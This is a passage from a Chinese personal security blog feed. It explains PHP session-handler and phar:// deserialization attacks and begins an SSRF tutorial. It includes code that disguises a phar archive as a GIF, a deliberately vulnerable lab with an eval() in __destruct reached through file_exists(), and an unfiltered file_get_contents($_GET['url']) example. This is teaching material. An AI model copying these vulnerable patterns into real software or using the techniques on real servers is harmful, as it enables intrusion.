session工作流程</h2><p>会话的工作流程很简单，当开始一个会话时，<code>PHP</code>会尝试从请求中查找会话 <code>ID</code> （通常通过会话 <code>cookie</code>），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，**<code>PHP</code> 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话**，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存，例如登录如下网页<code>Cokkie、Get、Post</code>都不存在<code>session id</code>，于是就使用了<code>set-cookie</code>头<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144834-72365e9a-0518-1.png" alt="img"></a>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，<code>php</code>也可以自动将<code>session id</code>添加到<code>url</code>参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项.</p><p>会话开始之后，<code>PHP</code> 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;ghtwf01&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//就是判断是否设置了username，如果没有设置的话，就把username这个session变量设置为所需的内容</span></span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144840-76164138-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144840-76164138-0518-1.png" alt="img"></a></p><p>主要的一个重点还是session相较于cookie来说的话，是存储在服务器中的。因此，可以直接通过改写session文件进行多种攻击。</p><h2 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h2><p><code>php.ini</code>里面有如下六个相对重要的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path=&quot;&quot;      --设置session的存储位置</span><br><span class="line">session.save_handler=&quot;&quot;   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="line">session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="line">session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="line">session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span><br></pre></td></tr></table></figure><p>如<code>phpstudy</code>下上述配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path = &quot;/tmp&quot;      --所有session文件存储在/tmp目录下</span><br><span class="line">session.save_handler = files    --表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start = 0          --表明默认不启动</span><br><span class="line">session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎</span><br><span class="line">session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量</span><br><span class="line">session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)</span><br></pre></td></tr></table></figure><p>对于session文件来说，文件名的格式都是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_xxxxx</span><br></pre></td></tr></table></figure><p>一般来说是默认使用文件的形式进行存储。</p><p>这种类似的形式，后面部分的填充是自动生成的，也就是session id部分。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144851-7c6e2e6a-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144851-7c6e2e6a-0518-1.png" alt="img"></a></p><p><code>session.serialize_handler</code>，它定义的引擎有三种</p><p>|处理器名称|存储格式|<br><code>|php|  键名 + 竖线 + 经过serialize()函数序列化处理的值|</code><br><code>|php_binary|  键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|</code><br><code>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</code></p><h2 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h2><p>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（这里是序列化和反序列化的引擎语言使用PHP)</p><p> 可以直接看见sessionid的，使用f12打开控制台，然后在存储选项可以看见。</p><p>session是<code>$_SESSION[&#39;session&#39;]</code>的键名，在|之后是传入的GET参数，经过序列化之后的值。</p><p>键名 + 竖线 + 经过serialize()函数序列化处理的值</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144905-85162680-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144905-85162680-0518-1.png" alt="img"></a></p><p>图片中键名是session，后面的部分是序列化的值，表示string类型，有7位，内容</p><h2 id="php-binary处理器："><a href="#php-binary处理器：" class="headerlink" title="php_binary处理器："></a>php_binary处理器：</h2><p>再来看看<code>session.serialize_handler</code>等于<code>php_binary</code>时候的序列化结果</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 <code>35</code>，<code>35</code> 对应的 <code>ASCII</code> 码为<code>#</code>，所以最终的结果如下</p><p>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144911-888b7d60-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144911-888b7d60-0518-1.png" alt="img"></a></p><p>这部分会在键名前加一个和键名长度相等的ASCII码表示的字符。</p><h2 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h2><p>最后就是<code>session.serialize_handler</code>等于<code>php_serialize</code>时候的序列化结果，代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下</p><p>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144917-8c3357da-0518-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144917-8c3357da-0518-1.png" alt="img"></a></p><p>其中a:1表示$_SESSION中有一个元素，同时在花括号里面的内容是传入的GET的值。</p><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 <code>|</code> , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p><p>键名 + 竖线 + 经过serialize()函数序列化处理的值</p><p>|php_serialize(php&gt;5.5.4)|经过serialize()函数序列化处理的数组|</p><p>也就是说，可以通过php_serialize来引入|，然后当php进行解析的时候，就会将其中的|前判断为键名。</p><p><strong>遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。<br>这里可能会有一个小疑问，为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</strong></p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/1937992-20200530211048774-1369796877.png" alt="img"></p><p>直接看这个博客：<a href="https://www.cnblogs.com/hello-py/articles/13501786.html">https://www.cnblogs.com/hello-py/articles/13501786.html</a></p><p>简单的总结一下，这里主要是有两个部分的问题：</p><p>1、首先是对于session文件使用了两种不同的处理器来进行存储和读取，一个是php_serialize，这里存储的方式是使用a:1{}这种格式，而另外一个是php处理器，这里使用的是键名|值这种方式。当传入的值经过php_serialize处理器进行存储的时候，可以传入<code>|</code>这个符号，当再次使用php处理器进行读取的时候，会直接将<code>|</code>前面的部分读取为键名，然后将后面的部分读取为内容。</p><p>2、看上面的截图，当上述部分成立了之后，会自动的对值的部分进行反序列化。</p><p>对于是否有session反序列化漏洞，最好可以通过查看phpinfo()配置来进行了解。</p><h1 id="Phar拓展反序列化攻击面："><a href="#Phar拓展反序列化攻击面：" class="headerlink" title="Phar拓展反序列化攻击面："></a>Phar拓展反序列化攻击面：</h1><h2 id="phar文件简介"><a href="#phar文件简介" class="headerlink" title="phar文件简介"></a>phar文件简介</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一个<code>php</code>应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在<code>window</code>操作系统上面的安装程序、一个<code>jquery</code>库等等，为了做到这点<code>php</code>采用了<code>phar</code>文档文件格式，这个概念源自<code>java</code>的<code>jar</code>，但是在设计时主要针对 PHP 的 Web 环境，与 <code>JAR</code> 归档不同的是<code>Phar</code>归档可由 <code>PHP</code> 本身处理，因此不需要使用额外的工具来创建或使用，使用<code>php</code>脚本就能创建或提取它。<code>phar</code>是一个合成词，由<code>PHP</code>和 <code>Archive</code>构成，可以看出它是<code>php</code>归档文件的意思(简单来说<code>phar</code>就是<code>php</code>压缩文档，不经过解压就能被 <code>php</code> 访问并执行)</p><h3 id="phar组成结构"><a href="#phar组成结构" class="headerlink" title="phar组成结构"></a>phar组成结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub：它是phar的文件标识，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;;</span><br><span class="line">manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储</span><br><span class="line">contents：压缩文件的内容</span><br><span class="line">signature：签名，放在文件末尾</span><br></pre></td></tr></table></figure><p>eg:</p><p><code>php</code>内置了一个<code>Phar</code>类来处理相关操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><p><strong>php Version&gt;&#x3D;5.3.0</strong></p><p>这里有两个关键点：</p><p>一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；</p><p>二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多</p><h2 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h2><p><code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化</p><p>毕竟通过setmetadata()这个方法传入的是一个对象。</p><p>既然有序列化，自然会有反序列化。</p><p>有序列化数据必然会有反序列化操作，<code>php</code>一大部分的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化<br> 在网上扒了一张图<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png"><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112145239-0436a1c4-0519-1.png" alt="img"></a></p><h3 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h3><p>在前面分析<code>phar</code>的文件结构时可能会注意到，<code>php</code>识别<code>phar</code>文件是通过其文件头的<code>stub</code>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将<code>phar</code>文件伪装成其他格式的文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>phar文件要能够上传到服务器端。</p><p>如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等文件操作的函数</p><p>要有可用的魔术方法作为“跳板”。</p><p>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload_file.php`，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</span><br><span class="line"> `upload_file.html` 文件上传表单</span><br><span class="line"> `file_un.php` 存在`file_exists()`，并且存在`__destruct()</span><br></pre></td></tr></table></figure><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>upload_file.html</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>file_un.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p>直接将文件头和文件名改成gif格式的，然后在通过phar:&#x2F;&#x2F;这个伪协议进行访问，就能够造成攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello,World!</title>
      <link href="/2022/06/15/hello/"/>
      <url>/2022/06/15/hello/</url>
      
        <content type="html"><![CDATA[<p>很高兴，终于把博客搭建好了。</p><p>之前为了搭建这个玩意我来来回回折腾了好久。最开始是使用的NEXT主题，结果遇到了一堆问题。而且node.js也在疯狂的爆出各种错误。然后github也没办法使用hexo d去进行文章推送。</p><p>从一开始到现在，差不多算是折腾了一个星期吧（省去中间的相隔的时间）</p><p>啥时候有时间我再写一篇博客搭建记录。</p><p>不过现在嘛，还是只能说很高兴吧，最开始的时候一直是使用CSDN博客进行凑数的。</p><p>经过了一年的学习，对于信息安全也越发的热爱了，终于想起来要搭建一个个人博客。</p><p>那句话怎么说的来着？生活要有仪式感？</p><p>哈。</p><p>这个就算是我的仪式感吧。</p><p>以后我会尽量把我自己的学习记录到博客上，然后对于我自己看一些东西，我也会自己写一些书评，基本还是给自己一个记录吧。</p><p>可能还会给自己写一些日记之类的，到时候加一个加密功能。</p><p>嗯，差不多就记录到这里。</p>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF(服务器端请求伪造)漏洞</title>
      <link href="/2022/06/15/SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E6%BC%8F%E6%B4%9E%EF%BC%9A/"/>
      <url>/2022/06/15/SSRF(%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)%E6%BC%8F%E6%B4%9E%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-服务器端请求伪造-漏洞-理论部分-："><a href="#SSRF-服务器端请求伪造-漏洞-理论部分-：" class="headerlink" title="SSRF(服务器端请求伪造)漏洞(理论部分)："></a>SSRF(服务器端请求伪造)漏洞(理论部分)：</h1><h2 id="1、概述："><a href="#1、概述：" class="headerlink" title="1、概述："></a>1、概述：</h2><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p><p>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的<strong>内部系统</strong>。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/20200226013932770.png" alt="在这里插入图片描述"></p><blockquote><p>SSRF和CSRF（Cross-site request forgery）其实是有点相关的，挺有意思，一个是服务器请求伪造，一个是跨站请求伪造。</p></blockquote><h2 id="2、漏洞成因："><a href="#2、漏洞成因：" class="headerlink" title="2、漏洞成因："></a>2、漏洞成因：</h2><p>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<strong>存在缺陷的web应用作为代理</strong>攻击远程和本地的服务器。</p><p>（举个例子，博客里的图片引用一般都是通过url的方式来进行引用的，这其实就是请求了别的服务器上存储的图片数据，如果没有对这个数据进行过滤的话，可能就会被造成SSRF攻击）</p><h2 id="3、常见漏洞点："><a href="#3、常见漏洞点：" class="headerlink" title="3、常见漏洞点："></a>3、常见漏洞点：</h2><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622165334021.png" alt="image-20220622165334021"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622165343882.png" alt="image-20220622165343882"></p><p>博客里面用来读取图片的这一段也算。</p><h2 id="4、实现攻击方式："><a href="#4、实现攻击方式：" class="headerlink" title="4、实现攻击方式："></a>4、实现攻击方式：</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="http://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h2 id="5、SSRF漏洞相关函数和协议："><a href="#5、SSRF漏洞相关函数和协议：" class="headerlink" title="5、SSRF漏洞相关函数和协议："></a>5、SSRF漏洞相关函数和协议：</h2><h3 id="1、file-get-contents"><a href="#1、file-get-contents" class="headerlink" title="1、file_get_contents()"></a>1、file_get_contents()</h3><p>函数作用：</p><blockquote><p>将整个文件读入道一个字符串中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622170026752.png" alt="image-20220622170026752"></p></blockquote><p><strong>（注意，不只是可以用来读取本地文件，同样也可以用来访问url表示的外部文件，否则就不会出现SSRF了）</strong></p><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p><p><strong>需要将php.ini中的allow_url_fopen设为on状态。</strong>预设是启动的。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、fsockopen"><a href="#2、fsockopen" class="headerlink" title="2、fsockopen()"></a>2、fsockopen()</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622171221093.png" alt="image-20220622171221093"></p></blockquote><p>使用例：</p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220622171258168.png" alt="image-20220622171258168"></p></blockquote><p>这个函数的作用就是实现用户对于指定url数据的获取，使用套接字与服务器建立<code>tcp</code>连接，传输数据，变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30是时限。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span 